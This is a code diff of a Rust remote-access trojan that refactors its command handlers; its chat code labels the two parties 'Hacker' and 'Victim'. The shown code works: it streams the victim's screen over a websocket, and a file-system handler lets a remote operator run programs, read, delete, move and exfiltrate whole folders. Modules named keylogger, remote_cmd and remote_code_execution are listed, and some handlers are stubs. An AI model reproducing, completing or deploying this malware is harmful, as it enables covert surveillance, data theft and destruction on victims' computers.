-		start_streaming_new(&mut socket);
-		// start_streaming_old(&mut socket)	;
-	});
+impl Function for RemoteScreen {
+    fn handler(payload: &[u8], ctx: &mut super::func::Context) -> anyhow::Result<()> {
+        let url = format!("ws://{}:4042", ctx.conn.ip);
+        let (mut socket, _response) = connect(&url).unwrap();
+        println!("Socket connected");
+
+        std::thread::spawn(move || {
+            start_streaming_new(&mut socket);
+        });
+        Ok(())
+    }
 }
-
 
 fn start_streaming_new(socket: &mut Socket) {
-	let display = Display::primary().unwrap();
-	let mut capturer = Capturer::new(display).unwrap();
-	loop {
-		match capturer.frame() {
-			Ok(frame) => {
-				socket.send(Message::Binary(frame.to_vec())).unwrap();
-			},
-			Err(error) => if error.kind() == std::io::ErrorKind::WouldBlock {
-				std::thread::sleep(std::time::Duration::new(0, 1_000_000_000u32 / 60)); 
-				continue;
-			},
-		}
-	}
+    let display = Display::primary().unwrap();
+    let mut capturer = Capturer::new(display).unwrap();
+    loop {
+        match capturer.frame() {
+            Ok(frame) => {
+                socket.send(Message::Binary(frame.to_vec())).unwrap();
+            }
+            Err(error) => {
+                if error.kind() == std::io::ErrorKind::WouldBlock {
+                    std::thread::sleep(std::time::Duration::new(0, 1_000_000_000u32 / 60));
+                    continue;
+                }
+            }
+        }
+    }
 }
 
-
 fn start_streaming_old(socket: &mut Socket) {
-	set_process_dpi_awareness();
-	co_init();
-	
-	let adapter = AdapterFactory::new().get_adapter_by_idx(0).unwrap();
-	let output = adapter.get_display_by_idx(0).unwrap();
+    set_process_dpi_awareness();
+    co_init();
 
-	let mut dupl = DesktopDuplicationApi::new(adapter, output.clone()).unwrap();
+    let adapter = AdapterFactory::new().get_adapter_by_idx(0).unwrap();
+    let output = adapter.get_display_by_idx(0).unwrap();
 
-	let (device, ctx) = dupl.get_device_and_ctx();
-	let mut texture_reader = TextureReader::new(device, ctx);
+    let mut dupl = DesktopDuplicationApi::new(adapter, output.clone()).unwrap();
 
+    let (device, ctx) = dupl.get_device_and_ctx();
+    let mut texture_reader = TextureReader::new(device, ctx);
 
-	let mut pic_data = vec![0; 0];
-	loop {
-		// output.wait_for_vsync().unwrap();
-		let tex = dupl.acquire_next_frame_now();
+    let mut pic_data = vec![0; 0];
+    loop {
+        // output.wait_for_vsync().unwrap();
+        let tex = dupl.acquire_next_frame_now();
 
-		if let Ok(tex) = tex {
-			texture_reader.get_data(&mut pic_data, &tex).unwrap();
-			// std::mem::take so we don't cringe clone
-			socket.send(Message::binary(std::mem::take(&mut pic_data))).unwrap();
-		}
-	}
+        if let Ok(tex) = tex {
+            texture_reader.get_data(&mut pic_data, &tex).unwrap();
+            // std::mem::take so we don't cringe clone
+            socket
+                .send(Message::binary(std::mem::take(&mut pic_data)))
+                .unwrap();
+        }
+    }
 }
 
 ```
@@ -2166,10 +1948,15 @@ fn start_streaming_old(socket: &mut Socket) {
 ## File: `src/handlers/trolling.rs`
 
 ```rs
-pub fn handle_trolling(payload: &[u8]) {
-	// Handle trolling functionality
-}
+use crate::handlers::func::Function;
 
+pub struct Trolling;
+
+impl Function for Trolling {
+    fn handler(payload: &[u8], ctx: &mut super::func::Context) -> anyhow::Result<()> {
+        todo!()
+    }
+}
 
 ```
 
@@ -2178,11 +1965,22 @@ pub fn handle_trolling(payload: &[u8]) {
 ## File: `src/handlers/func.rs`
 
 ```rs
-use crate::Socket;
+use crate::{Connection, Socket};
+pub struct Context<'a> {
+    pub socket: &'a mut Socket,
+    pub conn: &'a Connection,
+}
 
+impl<'a> Context<'a> {
+    pub fn from(socket: &'a mut Socket, conn: &'a Connection) -> Self {
+        Self { socket, conn }
+    }
+}
 
-trait Function {
-    fn handler(payload : &[u8], socket : &mut Socket);
+pub type HandlerFn = fn(payload: &[u8], ctx: &mut Context) -> anyhow::Result<()>;
+
+pub trait Function {
+    fn handler(payload: &[u8], ctx: &mut Context) -> anyhow::Result<()>;
 }
 
 ```
@@ -2194,32 +1992,34 @@ trait Function {
 ```rs
 use tungstenite::connect;
 
-use crate::Connection;
-
 // Chat will always use 4042 port
-pub fn handle_chat(payload: &[u8], connection: &Connection) {
-	let url = format!("ws://{}:{}", connection.ip, 4042);
-	let (socket, _) = connect(url).expect("Failed to connect");
-}
+use crate::handlers::func::Function;
 
 enum Sender {
-	Hacker,
-	Victim,
+    Hacker,
+    Victim,
 }
 
 struct Message {
-	sender: Sender,
-	text: String,
+    sender: Sender,
+    text: String,
+}
+pub struct Chat {
+    messages: Vec<Message>,
 }
 
-struct Chat {
-	messages: Vec<Message>,
+impl Function for Chat {
+    fn handler(payload: &[u8], ctx: &mut super::func::Context) -> anyhow::Result<()> {
+        let url = format!("ws://{}:{}", ctx.conn.ip, 4042);
+        let (socket, _) = connect(url).expect("Failed to connect");
+        Ok(())
+    }
 }
 
 impl Chat {
-	fn start(&self) {
-	}
+    fn start(&self) {}
 }
+
 ```
 
 ---
@@ -2227,10 +2027,14 @@ impl Chat {
 ## File: `src/handlers/remote_code_execution.rs`
 
 ```rs
-pub fn handle_remote_code_execution(payload: &[u8]) {
-	// Handle remote code execution functionality
-}
+use crate::handlers::func::Function;
 
+pub struct RemoteCodeExecution;
+impl Function for RemoteCodeExecution {
+    fn handler(payload: &[u8], ctx: &mut super::func::Context) -> anyhow::Result<()> {
+        todo!()
+    }
+}
 
 ```
 
@@ -2245,6 +2049,7 @@ use std::path::Path;
 
 use tungstenite::Message;
 
+use crate::handlers::func::Function;
 use crate::Socket;
 
 /*
@@ -2273,117 +2078,126 @@ Example:
 5 - Get folder/file
 4C:/Users/james/folder1/file.txt
 */
+pub struct FileSystem;
 
+impl Function for FileSystem {
+    fn handler(payload: &[u8], ctx: &mut super::func::Context) -> anyhow::Result<()> {
+        let operation = payload[0] as char;
+        let paths = payload[1..]
+            .iter()
+            .map(|b| *b as char)
+            .collect::<String>()
+            .split('$')
+            .map(|s| s.to_string())
+            .collect::<Vec<String>>();
 
-pub fn handle_file_system(payload: &[u8], socket: &mut Socket) {
-	let operation = payload[0] as char;
-	let paths = payload[1..]
-		.iter()
-		.map(|b| *b as char)
-		.collect::<String>()
-		.split('$')
-		.map(|s| s.to_string())
-		.collect::<Vec<String>>();
+        let path = Path::new(&paths[0]);
+        match operation {
+            '1' => run_file(path, ctx.socket),
+            '2' => get_path_content(path, ctx.socket),
+            '3' => delete_path(path, ctx.socket),
+            '4' => move_object(path, Path::new(&paths[1]), ctx.socket),
+            '5' => download_object(path, ctx.socket),
+            _ => {
+                panic!("Invalid FS operation");
+            }
+        };
 
-	let path = Path::new(&paths[0]);
-	match operation {
-		'1' => run_file(path, socket),
-		'2' => get_path_content(path, socket),
-		'3' => delete_path(path, socket),
-		'4' => move_object(path, Path::new(&paths[1]), socket),
-		'5' => download_object(path, socket),
-		_ => { panic!("Invalid FS operation"); }
-	};
+        Ok(())
+    }
 }
 
 fn download_object(path: &Path, socket: &mut Socket) {
-	let metadata = fs::metadata(path).unwrap();
-	if metadata.is_file() {
-		let file_name = path.file_name().unwrap().to_str().unwrap();
+    let metadata = fs::metadata(path).unwrap();
+    if metadata.is_file() {
+        let file_name = path.file_name().unwrap().to_str().unwrap();
 
-		let mut scuf_buf = vec![];
-		scuf_buf.extend_from_slice(file_name.as_bytes());
-		scuf_buf.push(b'\n');
+        let mut scuf_buf = vec![];
+        scuf_buf.extend_from_slice(file_name.as_bytes());
+        scuf_buf.push(b'\n');
 
-		let mut file = fs::File::open(path).unwrap();
-		let mut file_buffer = [0; 1024];
-		loop {
-			let n = file.read(&mut file_buffer).unwrap();
-			if n == 0 {
-				break;
-			}
-			scuf_buf.extend_from_slice(&file_buffer[..n]);
-		}
+        let mut file = fs::File::open(path).unwrap();
+        let mut file_buffer = [0; 1024];
+        loop {
+            let n = file.read(&mut file_buffer).unwrap();
+            if n == 0 {
+                break;
+            }
+            scuf_buf.extend_from_slice(&file_buffer[..n]);
+        }
 
-		socket.send(Message::Binary(scuf_buf)).unwrap();
-	} else if metadata.is_dir() {
-		for entry in fs::read_dir(path).unwrap() {
-			let entry = entry.unwrap();
-			download_object(&entry.path(), socket);
-		}
-	}
+        socket.send(Message::Binary(scuf_buf)).unwrap();
+    } else if metadata.is_dir() {
+        for entry in fs::read_dir(path).unwrap() {
+            let entry = entry.unwrap();
+            download_object(&entry.path(), socket);
+        }
+    }
 }
 
-
 fn run_file(path: &Path, socket: &mut Socket) {
-	if std::process::Command::new(path).spawn().is_ok() {
-		socket.send("OK runned".into()).unwrap();
-		return;
-	}
-	socket.send("NO not runned".into()).unwrap()
+    if std::process::Command::new(path).spawn().is_ok() {
+        socket.send("OK runned".into()).unwrap();
+        return;
+    }
+    socket.send("NO not runned".into()).unwrap()
 }
 
 fn get_path_content(path: &Path, socket: &mut Socket) {
-	let meta = fs::metadata(path);
-	if let Ok(metadata) = meta {
-		if metadata.is_file() {
-			let contents = fs::read_to_string(path).unwrap();
-			socket.write(contents.into()).unwrap();
-		} else if metadata.is_dir() {
-			let contents = fs::read_dir(path).unwrap();
-			let mut files = String::new();
-			for obj in contents {
-				let obj = obj.unwrap();
-				let file_type = if obj.file_type().unwrap().is_dir() {
-					"Dir"
-				} else {
-					"File"
-				};
-				files.push_str(&format!("{} ({})\n", obj.file_name().into_string().unwrap(), file_type));
-			}
-			socket.send(files.into()).unwrap();
-		}
-	}
+    let meta = fs::metadata(path);
+    if let Ok(metadata) = meta {
+        if metadata.is_file() {
+            let contents = fs::read_to_string(path).unwrap();
+            socket.write(contents.into()).unwrap();
+        } else if metadata.is_dir() {
+            let contents = fs::read_dir(path).unwrap();
+            let mut files = String::new();
+            for obj in contents {
+                let obj = obj.unwrap();
+                let file_type = if obj.file_type().unwrap().is_dir() {
+                    "Dir"
+                } else {
+                    "File"
+                };
+                files.push_str(&format!(
+                    "{} ({})\n",
+                    obj.file_name().into_string().unwrap(),
+                    file_type
+                ));
+            }
+            socket.send(files.into()).unwrap();
+        }
+    }
 }
-
 
 fn delete_path(path: &Path, socket: &mut Socket) {
-	fn remove(path: &Path) {
-		let meta = fs::metadata(path);
-		if let Ok(metadata) = meta {
-			if metadata.is_dir() {
-				fs::remove_dir_all(path).unwrap();
-			} else if metadata.is_file() {
-				fs::remove_file(path).unwrap();
-			}
-		}
-	}
-	let metadata = fs::metadata(path).unwrap();
-	if !metadata.is_symlink() {
-		remove(path);
-	} else if let Ok(link_path) = fs::read_link(path) {
-		remove(&link_path);
-	}
-	socket.send(format!("OK deleted {}", path.to_str().unwrap()).into()).unwrap()
+    fn remove(path: &Path) {
+        let meta = fs::metadata(path);
+        if let Ok(metadata) = meta {
+            if metadata.is_dir() {
+                fs::remove_dir_all(path).unwrap();
+            } else if metadata.is_file() {
+                fs::remove_file(path).unwrap();
+            }
+        }
+    }
+    let metadata = fs::metadata(path).unwrap();
+    if !metadata.is_symlink() {
+        remove(path);
+    } else if let Ok(link_path) = fs::read_link(path) {
+        remove(&link_path);
+    }
+    socket
+        .send(format!("OK deleted {}", path.to_str().unwrap()).into())
+        .unwrap()
 }
 
-
 fn move_object(from: &Path, to: &Path, socket: &mut Socket) {
-	if fs::rename(from, to).is_ok() {
-		socket.send("OK deleted".into()).unwrap();
-		return;
-	}
-	socket.send("NO not deleted".into()).unwrap();
+    if fs::rename(from, to).is_ok() {
+        socket.send("OK deleted".into()).unwrap();
+        return;
+    }
+    socket.send("NO not deleted".into()).unwrap();
 }
 
 ```
@@ -2396,13 +2210,14 @@ fn move_object(from: &Path, to: &Path, socket: &mut Socket) {
 pub mod audio;
 pub mod chat;
 pub mod file_system;
+pub mod func;
 pub mod keylogger;
 pub mod remote_cmd;
 pub mod remote_code_execution;
 pub mod remote_screen;
 pub mod task_manager;
 pub mod trolling;
-pub mod webcam;
+// pub mod webcam;
 
 ```
 
